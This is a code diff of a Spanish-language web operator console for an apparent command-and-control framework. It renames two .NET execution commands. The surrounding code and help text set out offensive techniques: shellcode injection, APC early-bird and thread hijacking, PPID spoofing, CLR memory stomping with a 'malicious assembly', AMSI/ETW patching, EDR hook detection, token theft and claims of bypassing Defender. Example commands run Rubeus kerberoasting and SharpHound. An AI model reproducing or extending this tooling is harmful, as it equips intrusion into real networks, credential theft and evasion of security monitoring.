@@ -4998,12 +4998,12 @@ const AC_COMMANDS = [
   ['screenshot','captura → servidor'],
   ['inject','inject <pid> <sc.bin>  — section map + CreateRemoteThread en proceso existente'],
   ['inject-apc','inject-apc <sc.bin> [proc]  — APC early-bird: spawnea proc suspendido, inyecta, reanuda'],
-  ['exec-asm','exec-asm <asm.exe> [proc]  — .NET → Donut (shellcode) → APC en proceso sacrificial nuevo; sin CLR visible'],
-  ['exec-dotnet','exec-dotnet <asm.exe> [args]  — .NET inline-execute: CLR nativo en-proceso, captura Console.Write (Rubeus, Seatbelt, SharpHound)'],
+  ['dotnet-asm','dotnet-asm <asm.exe> [proc]  — .NET → Donut (shellcode) → APC en proceso sacrificial nuevo; sin CLR visible'],
+  ['dotnet-exec','dotnet-exec <asm.exe> [args]  — .NET inline-execute: CLR nativo en-proceso, captura Console.Write (Rubeus, Seatbelt, SharpHound)'],
   ['forkrun','forkrun <sc.bin> [proc]  — PPID spoof + section map + thread hijack en proc sacrificial'],
   ['stage2','stage2 <sc.bin>  — in-process shellcode (CreateThread en agente actual, bypasa Defender)'],
   ['bof','bof <nombre|archivo.o> [args]  — nombre=BOF del servidor; archivo.o=subido con upload'],
-  ['clrstomp','clrstomp <asm.exe> [args]  — .NET sin Donut/proceso nuevo: CLR vía GAC legítimo, machaca memoria con tu assembly; más sigiloso que exec-asm'],
+  ['clrstomp','clrstomp <asm.exe> [args]  — .NET sin Donut/proceso nuevo: CLR vía GAC legítimo, machaca memoria con tu assembly; más sigiloso que dotnet-asm'],
   ['thread-hijack','thread-hijack <pid> <sc.bin>  — section map + parchear RIP de thread (sin CreateRemoteThread)'],
   ['hook-check','hook-check  — escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)'],
   ['hw-bp-check','hw-bp-check  — detectar hardware breakpoints activos (DR0–DR3)'],
@@ -5076,7 +5076,7 @@ const AC_COMMANDS = [
 const AC_WIN_ONLY = new Set([
   'screenshot',
   'inject','inject-apc','thread-hijack','forkrun',
-  'exec-asm','exec-dotnet','clrstomp','bof','stage2',
+  'dotnet-asm','dotnet-exec','clrstomp','bof','stage2',
   'hook-check','hw-bp-check','mem-fluctuate','mem-fluctuate start','mem-fluctuate stop',
   'encode-uuid',
   'token','token whoami','token steal','token make','token drop',
@@ -5108,8 +5108,8 @@ const AC_FILE_CMDS = new Map([
   ['stage2',        ['.bin']],
   ['thread-hijack', ['.bin']],
   ['encode-uuid',   ['.bin']],
-  ['exec-asm',      ['.exe', '.dll']],
-  ['exec-dotnet',   ['.exe', '.dll']],
+  ['dotnet-asm',    ['.exe', '.dll']],
+  ['dotnet-exec',   ['.exe', '.dll']],
   ['clrstomp',      ['.exe', '.dll']],
   ['bof',           ['.o']],
   ['download',      null],
@@ -5370,17 +5370,17 @@ ${isWin ? `  screenshot                              captura → servidor
   inject-apc &lt;sc.bin&gt; [proc]             APC early-bird: spawnea [proc] suspendido, inyecta, reanuda (evasivo)
   forkrun &lt;sc.bin&gt; [proc]                PPID-spoof + section map + thread hijack en proceso sacrificial
   thread-hijack &lt;pid&gt; &lt;sc.bin&gt;          section map + parchear RIP de thread existente (sin CreateRemoteThread)
-  exec-asm &lt;asm.exe&gt; [proc]              .NET → Donut (shellcode) → APC en proceso sacrificial nuevo.
+  dotnet-asm &lt;asm.exe&gt; [proc]            .NET → Donut (shellcode) → APC en proceso sacrificial nuevo.
                                           Ventaja: sin CLR visible. Requiere Donut en el servidor.
   stage2 &lt;sc.bin&gt;                        in-process CreateThread (sin proc nuevo, bypasa Defender en Server 2022)
   bof &lt;nombre|archivo.o&gt; [args]          ejecutar BOF (COFF x64); nombre = BOF preinstalado en servidor,
                                           archivo.o = subido con upload; args = cadena libre separada por espacios
-  exec-dotnet &lt;asm.exe&gt; [args]           CLR inline-execute en-proceso: captura Console.Write, sin Donut ni
+  dotnet-exec &lt;asm.exe&gt; [args]          CLR inline-execute en-proceso: captura Console.Write, sin Donut ni
                                           proceso sacrificial. Equivalente a CS execute-assembly / Havoc dotnet
                                           inline-execute. Soporta Rubeus, Seatbelt, SharpHound, etc.
   clrstomp &lt;asm.exe&gt; [args_para_asm]    .NET sin Donut, sin proceso nuevo. Carga un assembly legítimo del GAC
                                           para traer el CLR al proceso actual, luego machaca su memoria con tu
-                                          assembly malicioso. Diferencias vs exec-asm:
+                                          assembly malicioso. Diferencias vs dotnet-asm:
                                             • Sin Donut — el agente no convierte a shellcode
                                             • Sin proceso nuevo — corre dentro del agente (o proceso anfitrión)
                                             • Sin PE en disco — el header del GAC original queda en memoria
@@ -5626,15 +5626,15 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • El proceso sigue ejecutándose (thread hijack temporal)
   • Requiere acceso al proceso con THREAD_SET_CONTEXT`,
 
-  'exec-asm': `<b>exec-asm</b> — ejecutar assembly .NET vía Donut en proceso sacrificial
+  'dotnet-asm': `<b>dotnet-asm</b> — ejecutar assembly .NET vía Donut en proceso sacrificial
 
   <span class="console-section">USO</span>
-  exec-asm &lt;assembly.exe&gt; [proceso_sacrificial]
+  dotnet-asm &lt;assembly.exe&gt; [proceso_sacrificial]
 
   <span class="console-section">EJEMPLOS</span>
-  exec-asm SharpHound.exe
-  exec-asm Seatbelt.exe svchost.exe
-  exec-asm Rubeus.exe ksh --tgtdeleg
+  dotnet-asm SharpHound.exe
+  dotnet-asm Seatbelt.exe svchost.exe
+  dotnet-asm Rubeus.exe ksh --tgtdeleg
 
   <span class="console-section">TÉCNICA</span>
   1. El servidor convierte el .NET EXE a shellcode con Donut
@@ -5646,16 +5646,16 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • Sin proceso especificado, usa svchost.exe
   • Si Defender detecta el proceso, probar clrstomp para ejecución in-process`,
 
-  'exec-dotnet': `<b>exec-dotnet</b> — CLR inline-execute en-proceso (Rubeus, Seatbelt, SharpHound…)
+  'dotnet-exec': `<b>dotnet-exec</b> — CLR inline-execute en-proceso (Rubeus, Seatbelt, SharpHound…)
 
   <span class="console-section">USO</span>
-  exec-dotnet &lt;assembly.exe&gt; [args para el assembly]
+  dotnet-exec &lt;assembly.exe&gt; [args para el assembly]
 
   <span class="console-section">EJEMPLOS</span>
-  exec-dotnet Rubeus.exe kerberoast /outfile:hashes.txt
-  exec-dotnet Seatbelt.exe -group=all
-  exec-dotnet SharpHound.exe -c All
-  exec-dotnet hellonet.exe
+  dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt
+  dotnet-exec Seatbelt.exe -group=all
+  dotnet-exec SharpHound.exe -c All
+  dotnet-exec hellonet.exe
 
   <span class="console-section">TÉCNICA</span>
   • CLR nativo en-proceso vía ICorRuntimeHost + AppDomain.Load_3 (sin Donut, sin proceso sacrificial)
@@ -5663,10 +5663,10 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • AMSI y ETW parcheados antes de cargar el assembly
   • Timeout de 3 minutos; los errores del assembly se capturan como output
 
-  <span class="console-section">DIFERENCIAS vs exec-asm / clrstomp</span>
-  exec-asm   → Donut + proceso sacrificial nuevo (CLR invisible en el agente)
-  clrstomp   → CLR vía GAC legítimo + stomping de memoria
-  exec-dotnet → CLR directo en el agente, salida capturada completa
+  <span class="console-section">DIFERENCIAS vs dotnet-asm / clrstomp</span>
+  dotnet-asm  → Donut + proceso sacrificial nuevo (CLR invisible en el agente)
+  clrstomp    → CLR vía GAC legítimo + stomping de memoria
+  dotnet-exec → CLR directo en el agente, salida capturada completa
 
   <span class="console-section">NOTAS</span>
   • El assembly corre en el AppDomain por defecto del agente
@@ -5689,7 +5689,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   3. Sobreescribe la memoria del assembly legítimo con el assembly malicioso
   4. Ejecuta el assembly malicioso dentro del mismo proceso
 
-  <span class="console-section">DIFERENCIAS vs exec-asm</span>
+  <span class="console-section">DIFERENCIAS vs dotnet-asm</span>
   • Sin Donut — no convierte a shellcode
   • Sin proceso nuevo — corre en el proceso del agente
   • El header del assembly legítimo del GAC permanece en memoria (cobertura)
@@ -6538,9 +6538,9 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       } catch(e) { addConsoleOutput('', 'bof error: '+e.message, null); return; }
       break;
     }
-    case 'exec-asm': {
+    case 'dotnet-asm': {
       const eaparts = args.split(' ');
-      if (!eaparts[0]) { addConsoleOutput('usage: exec-asm &lt;asm.exe&gt; [proc]', '', null); return; }
+      if (!eaparts[0]) { addConsoleOutput('usage: dotnet-asm <asm.exe> [proc]', '', null); return; }
       addConsoleOutput(`[*] Fetching ${eaparts[0]} from server…`, '', null);
       try {
         const asmBytes = await fetchSCFile(eaparts[0]);
@@ -6552,24 +6552,24 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         payload = u8ToB64(sc);
         taskType = 'FORK_RUN';
         taskArgs = eaparts.slice(1).join(' ');
-      } catch(e) { addConsoleOutput('', 'exec-asm error: '+e.message, null); return; }
+      } catch(e) { addConsoleOutput('', 'dotnet-asm error: '+e.message, null); return; }
       break;
     }
-    case 'exec-dotnet': {
-      // exec-dotnet <asm.exe> [args...]
+    case 'dotnet-exec': {
+      // dotnet-exec <asm.exe> [args...]
       // Loads CLR in-process, captures Console.Write output. No Donut, no sacrificial process.
-      const edparts = args.trim().split(' ');
-      const edFile  = edparts[0];
+      const edparts = args.trim().split(/\s+/);
+      const edFile  = edparts[0] || '';
       const edArgs  = edparts.slice(1).join(' ');
-      if (!edFile) { addConsoleOutput('uso: exec-dotnet &lt;asm.exe&gt; [args]', '', null); return; }
-      addConsoleOutput(`[*] exec-dotnet: cargando ${edFile}…`, '', null);
+      if (!edFile) { addConsoleOutput('uso: dotnet-exec <asm.exe> [args]', '', null); return; }
+      addConsoleOutput(`[*] dotnet-exec: cargando ${edFile}…`, '', null);
       try {
         const asmBytes = await fetchSCFile(edFile);
         const b64 = u8ToB64(new Uint8Array(asmBytes));
         taskType = 'DOTNET_EXEC';
         taskArgs = JSON.stringify({asm: b64, args: edArgs, type: '', method: ''});
         addConsoleOutput(`[+] ${edFile}: ${asmBytes.byteLength} bytes → DOTNET_EXEC`, '', null);
-      } catch(e) { addConsoleOutput('', 'exec-dotnet error: '+e.message, null); return; }
+      } catch(e) { addConsoleOutput('', 'dotnet-exec error: '+e.message, null); return; }
       break;
     }
     case 'clrstomp': {
